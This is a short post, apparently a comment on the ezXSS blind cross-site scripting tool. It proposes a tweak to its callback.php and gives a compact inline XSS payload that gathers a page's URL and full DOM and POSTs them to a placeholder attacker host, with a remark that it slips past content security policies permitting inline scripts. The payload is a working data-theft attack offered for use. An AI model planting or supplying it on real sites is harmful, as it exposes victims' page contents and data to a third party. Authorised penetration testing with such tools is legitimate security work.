Adding a quick check for the existence of parameters in callback.php of ezXSS (line 13-27) allows those parameters to be missing from log requests.

Now the plain JS code which doesn't need to retrieve a file can be shortened a bit:

    <script>window.addEventListener('load',()=>{x={},a=document,x.uri=a.URL,x.dom=a.documentElement.outerHTML,t=new XMLHttpRequest,t.open('POST','https://[your-domain]/callback',1),t.send(JSON.stringify(x))})</script>
   
It's still pretty long, but better than before.

The benefit of this is that it's not caught by CSPs which allow  inline scripts.
